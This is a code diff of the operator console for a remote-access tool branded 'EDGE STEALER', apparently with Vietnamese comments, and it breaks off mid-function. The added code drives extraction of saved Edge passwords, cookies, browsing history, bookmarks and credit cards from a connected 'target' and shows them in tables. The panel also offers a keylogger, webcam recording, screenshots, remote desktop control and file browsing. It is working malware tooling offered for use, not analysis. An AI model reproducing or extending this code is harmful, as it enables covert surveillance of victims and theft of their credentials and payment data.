+            background: #001a00;
+            color: #0f0;
+            padding: 6px;
+            text-align: left;
+            border: 1px solid #333;
+        }
+        .edge-table td {
+            padding: 6px;
+            border: 1px solid #333;
+            word-break: break-all;
+        }
+        .edge-table tr:hover {
+            background: #001a00;
+        }
+        
+        /* Loading indicator */
+        .loading {
+            color: #ff9900;
+            font-style: italic;
+        }
+        
+        /* Success/Error messages */
+        .success { color: #00ff41; }
+        .error { color: #ff3333; }
+        .warning { color: #ff9900; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <div class="brand">REMOTE<span>OPS</span></div>
-        <div style="display:flex; gap:10px;">
-            <input type="text" id="ip" value="ws://localhost:9010" style="width:200px; text-align:center;">
-            <button onclick="connect()">CONNECT SYSTEM</button>
+        <div class="brand">REMOTE<span>OPS</span> // EDGE STEALER</div>
+        <div style="display:flex; gap:10px; align-items:center;">
+            <input type="text" id="ip" value="ws://localhost:9010" style="width:220px;">
+            <button onclick="connect()">CONNECT TARGET</button>
+            <div id="connection-status" style="font-size:11px; color:#666;">Disconnected</div>
         </div>
     </div>
 
     <div class="main-grid">
         <div class="panel">
             <div class="tab-bar">
-                <button class="tab-btn active" onclick="switchTab('control')">CONTROLS</button>
+                <button class="tab-btn active" onclick="switchTab('control')">CONTROL</button>
+                <button class="tab-btn" onclick="switchTab('edge')">EDGE DATA</button>
                 <button class="tab-btn" onclick="switchTab('explorer')">EXPLORER</button>
-                <button class="tab-btn" onclick="switchTab('gallery')">GALLERY</button>
             </div>
 
-            <div id="tab-control" style="overflow-y: auto;">
-                
+            <!-- TAB CONTROL -->
+            <div id="tab-control">
                 <div class="ctrl-group">
-                    <div class="ctrl-title">APPLICATION CONTROL</div>
-                    <div class="input-row">
-                        <input type="text" id="app-input" placeholder="e.g: chrome, notepad, calc">
-                        <button onclick="startApp()">OPEN APP</button>
-                    </div>
-                    <div class="input-row">
-                        <input type="text" id="kill-app-input" placeholder="App Name (e.g: chrome)">
-                        <button class="btn-red" onclick="killApp()">KILL APP</button>
-                    </div>
-                    <button onclick="send('APP','LIST')" style="width:100%; margin-top:5px;">LIST RUNNING APPS</button>
-                </div>
-
-                <div class="ctrl-group">
-                    <div class="ctrl-title">PROCESS MANAGER</div>
-                    <div class="input-row">
-                        <input type="text" id="proc-cmd-input" placeholder="Full Cmd Path">
-                        <button onclick="startProcess()">START PROC</button>
-                    </div>
-                    <div class="input-row">
-                        <input type="number" id="kill-pid-input" placeholder="PID">
-                        <button class="btn-red" onclick="killProcess()">KILL PID</button>
-                    </div>
-                    <button onclick="send('PROCESS','LIST')" style="width:100%; margin-top:5px;">REFRESH PROCESS LIST</button>
-                </div>
-
-                <div class="ctrl-group">
-                    <div class="ctrl-title">SYSTEM POWER</div>
-                    <div class="btn-row">
-                        <button class="btn-red" onclick="if(confirm('Reboot remote PC?')) send('SYSTEM','RESTART')">REBOOT</button>
-                        <button class="btn-red" onclick="if(confirm('Shutdown remote PC?')) send('SYSTEM','SHUTDOWN')">SHUTDOWN</button>
-                    </div>
+                    <div class="ctrl-title">REMOTE DESKTOP</div>
+                    <button id="btn-remote" onclick="toggleRemote()" style="width:100%; padding:12px; font-weight:bold;">
+                        START REMOTE CONTROL
+                    </button>
                 </div>
 
                 <div class="ctrl-group">
                     <div class="ctrl-title">SURVEILLANCE</div>
                     <div class="btn-row">
-                        <button onclick="takeScreenshot()">📷 SCREENSHOT</button>
-                        <button onclick="startWebcam()">▶ WEBCAM</button>
+                        <button onclick="takeScreenshot()">SCREENSHOT</button>
+                        <button onclick="startWebcam()">WEBCAM REC</button>
                     </div>
-                    <button class="btn-red" onclick="stopWebcam()" style="width:100%">■ STOP CAM & SAVE</button>
+                    <button class="btn-red" onclick="stopWebcam()" style="margin-top:6px">STOP & SAVE</button>
                 </div>
 
                 <div class="ctrl-group">
-                    <div class="ctrl-title">REMOTE DESKTOP</div>
-                    <button id="btn-remote" onclick="toggleRemote()" style="width:100%; height:40px; font-weight:bold; border: 2px solid var(--accent-color); color:var(--accent-color);">
-                        🎮 START REMOTE CONTROL
-                    </button>
-                </div>
-
-                <div class="ctrl-group">
-                    <div class="ctrl-title">KEYLOGGER & SECURITY</div>
+                    <div class="ctrl-title">KEYLOGGER</div>
                     <div class="btn-row">
-                        <button onclick="send('KEYBOARD','START')">REC KEYS</button>
+                        <button onclick="send('KEYBOARD','START')">START REC</button>
                         <button class="btn-red" onclick="send('KEYBOARD','STOP')">STOP</button>
                     </div>
-                    <textarea id="key-stream" class="key-box" readonly placeholder="> Keystrokes will appear here..."></textarea>
-                    <div class="btn-row" style="margin-top:5px;">
-                        <button class="btn-red" onclick="send('KEYBOARD','LOCK')">🔒 LOCK INPUT</button>
-                        <button onclick="send('KEYBOARD','UNLOCK')">🔓 UNLOCK</button>
+                    <textarea id="key-stream" class="result-box" readonly placeholder="> Keystrokes appear here..."></textarea>
+                </div>
+            </div>
+
+            <!-- TAB EDGE STEALER -->
+            <div id="tab-edge" class="hidden">
+                <div class="ctrl-group">
+                    <div class="ctrl-title">MICROSOFT EDGE DATA EXTRACTOR</div>
+                    
+                    <div class="btn-row">
+                        <button onclick="getEdgeData('EXTRACT_ALL')" style="width:100%; padding:12px; font-weight:bold; background:#330000; border-color:#ff0066; color:#ff0066;">
+                            EXTRACT ALL DATA
+                        </button>
+                    </div>
+                    
+                    <div class="btn-row">
+                        <button onclick="getEdgeData('GET_PASSWORDS')" class="btn-blue" style="flex:1;">
+                            PASSWORDS
+                        </button>
+                        <button onclick="getEdgeData('GET_COOKIES')" style="flex:1;">
+                            COOKIES
+                        </button>
+                    </div>
+                    
+                    <div class="btn-row">
+                        <button onclick="getEdgeData('GET_HISTORY')" style="flex:1;">
+                            HISTORY
+                        </button>
+                        <button onclick="getEdgeData('GET_BOOKMARKS')" style="flex:1;">
+                            BOOKMARKS
+                        </button>
+                    </div>
+                    
+                    <div class="btn-row">
+                        <button onclick="getEdgeData('GET_CREDIT_CARDS')" style="flex:1; background:#220000; border-color:#ff3300; color:#ff3300;">
+                            CREDIT CARDS
+                        </button>
+                        <button onclick="getEdgeData('TEST')" style="flex:1;">
+                            TEST
+                        </button>
+                    </div>
+                    
+                    <!-- Progress bar -->
+                    <div id="edge-progress" class="hidden" style="margin-top:10px;">
+                        <div style="display:flex; justify-content:space-between; font-size:10px;">
+                            <span>Extracting...</span>
+                            <span id="progress-text">0%</span>
+                        </div>
+                        <div style="width:100%; height:4px; background:#333; margin-top:4px;">
+                            <div id="progress-bar" style="width:0%; height:100%; background:#00ff41;"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Edge data display area -->
+                    <div id="edge-data-display" class="edge-data-container">
+                        <!-- Tabs for different data types -->
+                        <div class="edge-tabs" id="edge-tabs"></div>
+                        
+                        <!-- Data tables -->
+                        <div id="edge-passwords" class="edge-table-container hidden">
+                            <table class="edge-table">
+                                <thead>
+                                    <tr>
+                                        <th>URL</th>
+                                        <th>Username</th>
+                                        <th>Password</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="passwords-table"></tbody>
+                            </table>
+                        </div>
+                        
+                        <div id="edge-cookies" class="edge-table-container hidden">
+                            <table class="edge-table">
+                                <thead>
+                                    <tr>
+                                        <th>Domain</th>
+                                        <th>Name</th>
+                                        <th>Value</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="cookies-table"></tbody>
+                            </table>
+                        </div>
+                        
+                        <div id="edge-history" class="edge-table-container hidden">
+                            <table class="edge-table">
+                                <thead>
+                                    <tr>
+                                        <th>URL</th>
+                                        <th>Title</th>
+                                        <th>Visits</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="history-table"></tbody>
+                            </table>
+                        </div>
+                        
+                        <div id="edge-raw" class="edge-table-container">
+                            <pre id="edge-raw-data"></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="btn-row">
+                        <button id="copy-edge" class="copy-btn" onclick="copyEdgeResult()" style="flex:1;">COPY RAW DATA</button>
+                        <button class="copy-btn btn-red" onclick="clearEdgeData()" style="flex:1;">CLEAR</button>
                     </div>
                 </div>
             </div>
 
-            <div id="tab-explorer" class="hidden" style="display:flex; flex-direction:column; height:100%;">
-                <div class="ctrl-group">
-                    <div class="ctrl-title">QUICK NAVIGATION</div>
-                    <button onclick="send('FILE','LIST_DIR',{path:''})" style="width:100%; margin-bottom:5px;">💻 MY COMPUTER</button>
-                    <button onclick="refresh()" style="width:100%">↻ REFRESH CURRENT</button>
-                </div>
-                <div style="flex-grow:1; border:1px solid #333; padding:10px; color:#666; font-size:11px;">
-                    * Select files in the main view for actions.
-                </div>
-            </div>
-
-            <div id="tab-gallery" class="hidden" style="display:flex; flex-direction:column; height:100%;">
-                <button onclick="send('FILE','LIST')" style="margin-bottom: 5px;">↻ RELOAD MEDIA</button>
-                <div id="file-list-box" style="flex-grow: 1; overflow-y: auto; border: 1px solid #333;">
-                    <div style="padding:10px; color:#666; text-align:center;">Empty</div>
-                </div>
+            <!-- TAB EXPLORER -->
+            <div id="tab-explorer" class="hidden">
+                <button onclick="send('FILE','LIST_DIR',{path:''})" style="width:100%; padding:10px;">MY COMPUTER</button>
+                <button onclick="refresh()" style="width:100%; margin-top:6px;">REFRESH DIR</button>
             </div>
         </div>
 
         <div class="right-panel">
             <div id="explorer-view" class="hidden" style="height:100%; display:flex; flex-direction:column;">
-                <div class="address-bar" id="breadcrumbs"><span>Waiting for connection...</span></div>
-                <div class="file-grid" id="file-grid"></div>
+                <div style="background:#111; padding:10px; color:#aaa; border-bottom:1px solid #333;" id="breadcrumbs">Not connected</div>
+                <div class="file-grid" id="file-grid" style="flex-grow:1; overflow:auto; padding:15px; display:grid; grid-template-columns:repeat(auto-fill,minmax(90px,1fr)); gap:12px;"></div>
             </div>
 
             <div id="media-view" class="preview-area">
-                <div id="view-label" style="position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:2px 8px; font-size:11px; border-radius:4px; z-index:10;">IDLE</div>
-                <img id="main-view" alt="">
-                <video id="video-player" controls class="hidden"></video>
+                <div id="view-label" style="position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.8); padding:5px 10px; font-size:12px; border-radius:4px; z-index:10;">IDLE</div>
+                <img id="main-view" alt="Stream">
             </div>
 
-            <div id="log-area">> System Ready.</div>
+            <div id="log-area">> Waiting for connection...</div>
         </div>
     </div>
-
-    <div id="context-menu">
-        <div class="ctx-item" onclick="ctxSmartOpen()"><span>🚀</span> Open / Run / Edit</div>
-        <div class="ctx-item" onclick="ctxDownload()"><span>⬇</span> Download File</div>
-        <div class="ctx-item" onclick="ctxDelete()" style="color:var(--alert-color)"><span>❌</span> Delete Permanently</div>
-    </div>
-
-    <div id="editor-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <span id="editor-title" style="font-weight:bold; color:var(--main-color);">EDITING FILE</span>
-                <div>
-                    <button onclick="saveFile()" style="margin-right:5px;">💾 SAVE OVERWRITE</button>
-                    <button class="btn-red" onclick="closeEditor()">CLOSE</button>
-                </div>
-            </div>
-            <textarea id="editor-text"></textarea>
-        </div>
-    </div>
-
-    <canvas id="record-canvas" style="display:none;"></canvas>
 
 <script>
-    // --- VARIABLES ---
     let ws = null;
-    let currentPath = "";
-    let selectedFile = null;
-    
-    // Remote Control
     let isRemoteControl = false;
     let isStreaming = false;
     let lastMouseSend = 0;
+    let edgeDataChunks = [];
+    let expectedEdgeChunks = 0;
+    let receivedEdgeChunks = 0;
+    let currentEdgeCommand = '';
 
-    // Media Rec
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    let isRecording = false;
-    const canvas = document.getElementById('record-canvas');
-    const ctx = canvas.getContext('2d');
+    // Edge data state
+    let edgePasswords = [];
+    let edgeCookies = [];
+    let edgeHistory = [];
+    let edgeBookmarks = [];
+    let edgeCreditCards = [];
 
-    // --- UTILS ---
-    function log(msg) { 
-        const d = new Date();
-        const time = d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds();
-        document.getElementById('log-area').innerText = `[${time}] ${msg}`; 
-    }
-    
-    function isTextFile(name) {
-        const exts = ['.txt','.cpp','.h','.hpp','.c','.js','.html','.css','.json','.xml','.log','.ini','.bat','.cmd','.py','.sh'];
-        return exts.some(ext => name.toLowerCase().endsWith(ext));
-    }
-
-    // --- CONNECT ---
     function connect() {
-        const url = document.getElementById('ip').value;
+        const url = document.getElementById('ip').value.trim();
+        if (!url) return alert("Enter WebSocket URL");
+        
         ws = new WebSocket(url);
         ws.binaryType = "arraybuffer";
-        
-        ws.onopen = () => { 
-            log("CONNECTED TO SERVER"); 
-            send('FILE','LIST_DIR',{path:''}); // Load root
+        ws.onopen = () => {
+            log("CONNECTED – Ready to steal Edge data");
+            document.getElementById('connection-status').textContent = "Connected";
+            document.getElementById('connection-status').style.color = "#00ff41";
         };
-        
-        ws.onclose = () => { 
-            log("DISCONNECTED"); 
-            toggleRemote(false); 
-        };
-        
         ws.onmessage = handleMessage;
-    }
-
-    function send(mod, cmd, payload={}) {
-        if(ws && ws.readyState === WebSocket.OPEN) {
-            ws.send(JSON.stringify({module:mod, command:cmd, payload:payload}));
-        } else {
-            log("Error: Not Connected");
-        }
-    }
-
-    // --- MESSAGE HANDLING ---
-    function handleMessage(evt) {
-        if (evt.data instanceof ArrayBuffer) {
-            handleBinary(evt.data);
-        } else {
-            try { handleJson(JSON.parse(evt.data)); } catch(e) { console.error(e); }
-        }
-    }
-
-    function handleBinary(data) {
-        const blob = new Blob([data]);
-        
-        // 1. Download File Mode
-        if (selectedFile && selectedFile.downloading) {
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a'); a.href = url; a.download = selectedFile.name; a.click();
-            selectedFile.downloading = false;
-            log("Download complete: " + selectedFile.name);
-            return;
-        }
-
-        // 2. Video Playback Mode (Khi click vào file .webm trong Gallery)
-        if (selectedFile && selectedFile.playingVideo) {
-            const videoBlob = new Blob([data], { type: 'video/webm' });
-            const url = URL.createObjectURL(videoBlob);
-            const player = document.getElementById('video-player');
-            player.src = url;
-            player.play();
-            selectedFile.playingVideo = false;
-            log("Playing video...");
-            return;
-        }
-
-        // 3. Stream/Image Mode (Remote Desktop / Webcam)
-        const url = URL.createObjectURL(blob);
-        const img = document.getElementById('main-view');
-        
-        // Double buffer trick to prevent flickering
-        const temp = new Image();
-        temp.onload = () => {
-            img.src = url;
-            if (isStreaming) requestAnimationFrame(requestNextFrame); // Loop for remote
+        ws.onclose = () => {
+            log("DISCONNECTED");
+            document.getElementById('connection-status').textContent = "Disconnected";
+            document.getElementById('connection-status').style.color = "#ff3333";
         };
-        temp.src = url;
+        ws.onerror = (err) => {
+            log("Connection error: " + err);
+        };
+    }
 
-        // Draw to canvas for recording if active
-        if(isRecording) {
-            if(canvas.width !== temp.width) { canvas.width = temp.width; canvas.height = temp.height; }
-            ctx.drawImage(temp, 0, 0);
+    function send(mod, cmd, payload = {}) {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            const request = { module: mod, command: cmd, payload };
+            console.log("Sending:", request);
+            ws.send(JSON.stringify(request));
+        } else {
+            log("ERROR: Not connected to server");
         }
     }
 
-    function handleJson(res) {
-        if (res.status === 'error') { log("ERROR: " + res.message); return; }
+    function log(msg) {
+        const d = new Date().toLocaleTimeString();
+        document.getElementById('log-area').textContent = `[${d}] ${msg}`;
+        console.log(`[LOG] ${msg}`);
+    }
 
-        if (res.command === 'LIST_DIR') renderExplorer(res);
-        else if (res.command === 'READ_TEXT') openEditor(res);
-        else if (res.command === 'WRITE_TEXT') { alert("File Saved!"); closeEditor(); refresh(); }
-        else if (res.command === 'DELETE') { log("Deleted."); refresh(); }
-        else if (res.command === 'EXECUTE') { log("Executed: " + res.message); }
-        
-        else if (res.module === 'KEYBOARD') {
-            const box = document.getElementById('key-stream');
-            box.value += res.data.key;
-            box.scrollTop = box.scrollHeight;
+    // === CHỨC NĂNG EDGE STEALER ===
+    function getEdgeData(action) {
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            alert("Please connect to server first!");
+            return;
         }
         
-        else if (res.module === 'FILE' && res.command === 'LIST') renderGallery(res.data);
-        else if (res.command === 'SAVE_VIDEO') { log("Video Saved to Server!"); send('FILE','LIST'); }
+        currentEdgeCommand = action;
+        edgeDataChunks = [];
+        expectedEdgeChunks = 0;
+        receivedEdgeChunks = 0;
         
-        // --- APP & PROCESS LIST ---
-        else if (msg.module === "APP" && msg.command === "LIST") {
-
-  let apps = [];
-
-  // CASE 1: backend gửi đúng dạng array group
-  if (Array.isArray(msg.data)) {
-    apps = msg.data;
-  }
-  // CASE 2: fallback
-  else if (Array.isArray(msg.apps)) {
-    apps = msg.apps;
-  }
-  else {
-    console.warn("APP LIST: format không đúng", msg);
-  }
-
-  // apps = [ { exe, count, processes:[{pid,threads},...] }, ... ]
-  this.appList.set(apps);
-  return;
-}
+        // Reset UI
+        document.getElementById('edge-data-display').style.display = 'block';
+        document.getElementById('edge-progress').classList.remove('hidden');
+        document.getElementById('progress-bar').style.width = '0%';
+        document.getElementById('progress-text').textContent = '0%';
         
-        else if (res.module === 'PROCESS' && res.command === 'LIST') {
-            console.log("PROCESS LIST:", res.data.process_list);
-            alert("Process List loaded in Console (F12)");
+        // Show raw data area
+        document.getElementById('edge-raw').classList.remove('hidden');
+        document.getElementById('edge-raw-data').textContent = '> Requesting Edge data: ' + action + ' ...\n';
+        
+        // Hide other tables
+        document.querySelectorAll('.edge-table-container').forEach(el => {
+            if (el.id !== 'edge-raw') el.classList.add('hidden');
+        });
+        
+        send('EDGE', action);
+    }
+
+    function handleEdgeChunk(chunkMsg) {
+        if (chunkMsg.status === 'start') {
+            expectedEdgeChunks = chunkMsg.total_chunks || 1;
+            receivedEdgeChunks = 0;
+            edgeDataChunks = [];
+            log(`Edge data: ${expectedEdgeChunks} chunks expected`);
         }
-        else if (res.module === 'APP' && res.command === 'START') { log("App Started: " + res.input); }
-        else if (res.module === 'APP' && res.command === 'KILL') { log(`Killed ${res.data.killed_count} process(es) matching '${res.data.keyword}'`); }
-        else if (res.module === 'PROCESS' && res.command === 'KILL') { log("Killed PID: " + res.pid); }
+        else if (chunkMsg.status === 'chunk') {
+            edgeDataChunks.push(chunkMsg.data);
+            receivedEdgeChunks++;
+            
+            // Update progress
+            const progress = Math.round((receivedEdgeChunks / expectedEdgeChunks) * 100);
+            document.getElementById('progress-bar').style.width = progress + '%';
+            document.getElementById('progress-text').textContent = progress + '%';
+            
+            log(`Edge chunk ${receivedEdgeChunks}/${expectedEdgeChunks} received`);
+            
+            if (chunkMsg.is_last) {
+                // All chunks received
+                const fullData = edgeDataChunks.join('');
+                processEdgeData(fullData);
+                document.getElementById('edge-progress').classList.add('hidden');
+            }
+        }
     }
 
-    // --- APP & PROCESS FUNCTIONS ---
-    function startApp() {
-        const name = document.getElementById('app-input').value;
-        if(name) send('APP', 'START', {path: name});
-    }
-    function killApp() {
-        const name = document.getElementById('kill-app-input').value;
-        if(name) send('APP', 'KILL', {name: name});
-    }
-    function startProcess() {
-        const path = document.getElementById('proc-cmd-input').value;
-        if(path) send('PROCESS', 'START', {path: path});
-    }
-    function killProcess() {
-        const pid = document.getElementById('kill-pid-input').value;
-        if(pid) send('PROCESS', 'KILL', {pid: parseInt(pid)});
+    function processEdgeData(dataStr) {
+        try {
+            const data = JSON.parse(dataStr);
+            
+            // Update raw display
+            document.getElementById('edge-raw-data').textContent = JSON.stringify(data, null, 2);
+            
+            // Process based on data structure
+            if (data.passwords && Array.isArray(data.passwords)) {
+                edgePasswords = data.passwords;
+                updatePasswordsTable();
+            }
+            
+            if (data.cookies && Array.isArray(data.cookies)) {
+                edgeCookies = data.cookies;
+                updateCookiesTable();
+            }
+            
+            if (data.history && Array.isArray(data.history)) {
+                edgeHistory = data.history;
+                updateHistoryTable();
+            }
+            
+            if (data.bookmarks && Array.isArray(data.bookmarks)) {
+                edgeBookmarks = data.bookmarks;
+            }
+            
+            if (data.credit_cards && Array.isArray(data.credit_cards)) {
+                edgeCreditCards = data.credit_cards;
+            }
+            
+            // Update tabs
+            updateEdgeTabs();
+            
+            log(`Edge data processed: ${edgePasswords.length} passwords, ${edgeCookies.length} cookies, ${edgeHistory.length} history entries`);
+            
+        } catch (err) {
+            console.error("Error parsing Edge data:", err);
+            document.getElementById('edge-raw-data').textContent = "ERROR parsing data: " + err.message + "\n\nRaw data:\n" + dataStr;
+        }
     }
 
-    // --- REMOTE DESKTOP CORE ---
-    function toggleRemote(forceState) {
-        if (forceState !== undefined) isRemoteControl = forceState;
-        else isRemoteControl = !isRemoteControl;
+    function updateEdgeTabs() {
+        const tabsContainer = document.getElementById('edge-tabs');
+        tabsContainer.innerHTML = '';
+        
+        const tabs = [
+            { id: 'edge-raw', label: 'Raw Data', count: '' },
+            { id: 'edge-passwords', label: 'Passwords', count: edgePasswords.length },
+            { id: 'edge-cookies', label: 'Cookies', count: edgeCookies.length },
+            { id: 'edge-history', label: 'History', count: edgeHistory.length }
+        ];
+        
+        tabs.forEach(tab => {
+            const tabEl = document.createElement('div');
+            tabEl.className = 'edge-tab';
+            if (tab.id === 'edge-raw') tabEl.classList.add('active');
+            tabEl.textContent = `${tab.label} (${tab.count})`;
+            tabEl.onclick = () => switchEdgeTab(tab.id);
+            tabsContainer.appendChild(tabEl);
+        });
+    }
 
+    function switchEdgeTab(tabId) {
+        // Hide all tables
+        document.querySelectorAll('.edge-table-container').forEach(el => {
+            el.classList.add('hidden');
+        });
+        
+        // Show selected tab
+        document.getElementById(tabId).classList.remove('hidden');
+        
+        // Update active tab
+        document.querySelectorAll('.edge-tab').forEach(tab => {
+            tab.classList.remove('active');
+        });
+        event.target.classList.add('active');
+    }
+
+    function updatePasswordsTable() {
+        const tbody = document.getElementById('passwords-table');
+        tbody.innerHTML = '';
+        
+        edgePasswords.forEach(item => {
+            const tr = document.createElement('tr');
+            
+            const urlTd = document.createElement('td');
+            urlTd.textContent = item.url || item.origin_url || '[No URL]';
+            
+            const userTd = document.createElement('td');
+            userTd.textContent = item.username || item.username_value || '[No username]';
+            
+            const passTd = document.createElement('td');
+            passTd.textContent = item.password || item.password_value || '[No password]';
+            if (passTd.textContent.includes('[ENCRYPTED]') || passTd.textContent.includes('[DECRYPT')) {
+                passTd.className = 'warning';
+            }
+            
+            tr.appendChild(urlTd);
+            tr.appendChild(userTd);
+            tr.appendChild(passTd);
+            tbody.appendChild(tr);
+        });
+    }
+
+    function updateCookiesTable() {
+        const tbody = document.getElementById('cookies-table');
+        tbody.innerHTML = '';
+        
+        edgeCookies.slice(0, 50).forEach(item => { // Limit to 50 for performance
+            const tr = document.createElement('tr');
+            
+            const domainTd = document.createElement('td');
+            domainTd.textContent = item.host || item.host_key || '[No domain]';
+            
+            const nameTd = document.createElement('td');
+            nameTd.textContent = item.name || '[No name]';
+            
+            const valueTd = document.createElement('td');
+            valueTd.textContent = item.value || '[No value]';
+            if (valueTd.textContent.length > 50) {
+                valueTd.textContent = valueTd.textContent.substring(0, 50) + '...';
+            }
+            
+            tr.appendChild(domainTd);
+            tr.appendChild(nameTd);
+            tr.appendChild(valueTd);
+            tbody.appendChild(tr);
+        });
+        
+        if (edgeCookies.length > 50) {
+            const tr = document.createElement('tr');
+            const td = document.createElement('td');
+            td.colSpan = 3;
+            td.textContent = `... and ${edgeCookies.length - 50} more cookies`;
+            td.className = 'warning';
+            tr.appendChild(td);
+            tbody.appendChild(tr);
+        }
+    }
+
+    function updateHistoryTable() {
+        const tbody = document.getElementById('history-table');
+        tbody.innerHTML = '';
+        
+        edgeHistory.slice(0, 50).forEach(item => { // Limit to 50
+            const tr = document.createElement('tr');
+            
+            const urlTd = document.createElement('td');
+            urlTd.textContent = item.url || '[No URL]';
+            if (urlTd.textContent.length > 40) {
+                urlTd.textContent = urlTd.textContent.substring(0, 40) + '...';
+            }
+            
+            const titleTd = document.createElement('td');
+            titleTd.textContent = item.title || '[No title]';
+            if (titleTd.textContent.length > 30) {
+                titleTd.textContent = titleTd.textContent.substring(0, 30) + '...';
+            }
+            
+            const visitsTd = document.createElement('td');
+            visitsTd.textContent = item.visits || item.visit_count || '0';
+            
+            tr.appendChild(urlTd);
+            tr.appendChild(titleTd);
+            tr.appendChild(visitsTd);
+            tbody.appendChild(tr);
+        });
+    }
+
+    function copyEdgeResult() {
+        const text = document.getElementById('edge-raw-data').textContent;
+        navigator.clipboard.writeText(text).then(() => {
+            alert("Edge data copied to clipboard!");
+        });
+    }
+
+    function clearEdgeData() {
+        edgePasswords = [];
+        edgeCookies = [];
+        edgeHistory = [];
+        edgeBookmarks = [];
+        edgeCreditCards = [];
+        
+        document.getElementById('edge-raw-data').textContent = '';
+        document.getElementById('passwords-table').innerHTML = '';
+        document.getElementById('cookies-table').innerHTML = '';
+        document.getElementById('history-table').innerHTML = '';
+        document.getElementById('edge-tabs').innerHTML = '';
+        
+        log("Edge data cleared");
+    }
+
+    function handleMessage(e) {
+        console.log("Received message type:", typeof e.data);
+        
+        // Handle binary data (screenshots, webcam)
+        if (e.data instanceof ArrayBuffer) {
+            const blob = new Blob([e.data], { type: 'image/jpeg' });
+            const url = URL.createObjectURL(blob);
+            document.getElementById('main-view').src = url;
+            if (isStreaming) {
+                // Request next frame if streaming
+                setTimeout(() => send('SCREEN','CAPTURE_BINARY',{save:false}), 50);
+            }
+            return;
+        }
+
+        try {
+            // Handle text/JSON data
+            const res = JSON.parse(e.data);
+            console.log("Parsed JSON response:", res);
+
+            // Check if this is a chunked Edge response
+            if (res.module === 'EDGE' && (res.status === 'start' || res.status === 'chunk')) {
+                handleEdgeChunk(res);
+                return;
+            }
+
+            // Handle regular Edge responses
+            if (res.module === 'EDGE') {
+                document.getElementById('edge-data-display').style.display = 'block';
+                document.getElementById('edge-progress').classList.add('hidden');
+                
+                if (res.data) {
+                    processEdgeData(JSON.stringify(res.data));
+                } else {
+                    processEdgeData(JSON.stringify(res));
+                }
+                
+                log(`EDGE ${res.command} – Received ${edgePasswords.length} passwords, ${edgeCookies.length} cookies`);
+                return;
+            }
+
+            // Handle keyboard data
+            if (res.module === 'KEYBOARD') {
+                const box = document.getElementById('key-stream');
+                box.style.display = 'block';
+                box.value += res.data?.key || '';
+                box.scrollTop = box.scrollHeight;
+            }
+
+            // Handle other modules
+            if (res.status === 'success') {
+                log(`${res.module} ${res.command} – Success`);
+            } else if (res.status === 'error') {
+                log(`ERROR: ${res.module} ${res.command} – ${res.message}`);
+            }
+
+        } catch(err) {
+            console.error("Error parsing message:", err, "Raw data:", e.data);
+        }
+    }
+
+    // ========== CÁC HÀM KHÁC (giữ nguyên) ==========
+    function switchTab(tab) {
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.querySelector(`button[onclick="switchTab('${tab}')"]`).classList.add('active');
+
+        document.getElementById('tab-control').classList.add('hidden');
+        document.getElementById('tab-edge').classList.add('hidden');
+        document.getElementById('tab-explorer').classList.add('hidden');
+        document.getElementById('explorer-view').classList.add('hidden');
+        document.getElementById('media-view').classList.add('hidden');
+
+        if (tab === 'edge') {
+            document.getElementById('tab-edge').classList.remove('hidden');
+            document.getElementById('media-view').classList.remove('hidden');
+        } else if (tab === 'explorer') {
+            document.getElementById('tab-explorer').classList.remove('hidden');
+            document.getElementById('explorer-view').classList.remove('hidden');
+        } else {
+            document.getElementById('tab-control').classList.remove('hidden');
+            document.getElementById('media-view').classList.remove('hidden');
+        }
+    }
+
+    function toggleRemote() {
+        isRemoteControl = !isRemoteControl;
         const btn = document.getElementById('btn-remote');
         const img = document.getElementById('main-view');
-        
         if (isRemoteControl) {
-            // ON
-            btn.innerHTML = "🔴 STOP REMOTE CONTROL";
-            btn.classList.add('active-remote');
-            img.style.cursor = "crosshair"; 
-            document.getElementById('view-label').innerText = "REMOTE CONTROL ACTIVE";
-            
-            // Start Stream Loop
+            btn.textContent = "STOP REMOTE";
+            btn.style.background = '#330000';
+            btn.style.borderColor = '#ff0066';
+            img.style.cursor = 'crosshair';
             isStreaming = true;
-            requestNextFrame();
-            
-            // Attach Input Events
-            setupInput(img);
-            switchTab('control'); // Force view
-            
-        } else {
-            // OFF
-            btn.innerHTML = "🎮 START REMOTE CONTROL";
-            btn.classList.remove('active-remote');
-            img.style.cursor = "default";
-            document.getElementById('view-label').innerText = "IDLE";
-            
-            isStreaming = false;
-            removeInput(img);
-        }
-    }
-
-    function requestNextFrame() {
-        if(!isStreaming) return;
-        // save: false -> Server just sends RAM buffer, no disk write
-        send('SCREEN', 'CAPTURE_BINARY', { save: false });
-    }
-
-    // --- INPUT HANDLING ---
-    function setupInput(el) {
-        el.onmousemove = (e) => {
-            if (Date.now() - lastMouseSend < 40) return; // Throttle 25fps
-            lastMouseSend = Date.now();
-            sendMouse('MOUSE_MOVE', e);
-        };
-        el.onmousedown = (e) => sendMouse('MOUSE_BTN', e, 'down');
-        el.onmouseup   = (e) => sendMouse('MOUSE_BTN', e, 'up');
-        el.oncontextmenu = (e) => { e.preventDefault(); };
-        el.onwheel = (e) => {
-            e.preventDefault();
-            send('INPUT', 'MOUSE_WHEEL', { delta: (e.deltaY > 0 ? -120 : 120) });
-        };
-        
-        window.onkeydown = (e) => { if(isRemoteControl) { e.preventDefault(); send('INPUT','KEY_EVENT',{key:e.keyCode, type:'down'}); }};
-        window.onkeyup   = (e) => { if(isRemoteControl) { e.preventDefault(); send('INPUT','KEY_EVENT',{key:e.keyCode, type:'up'}); }};
-    }
-
-    function removeInput(el) {
-        el.onmousemove = null; el.onmousedown = null; el.onmouseup = null; el.onwheel = null;
-        window.onkeydown = null; window.onkeyup = null;
-    }
-
-    function sendMouse(cmd, e, type=null) {
-        const img = document.getElementById('main-view');
-        const rect = img.getBoundingClientRect();
-        
-        // Calculate relative pos (0.0 - 1.0) based on ACTUAL image size
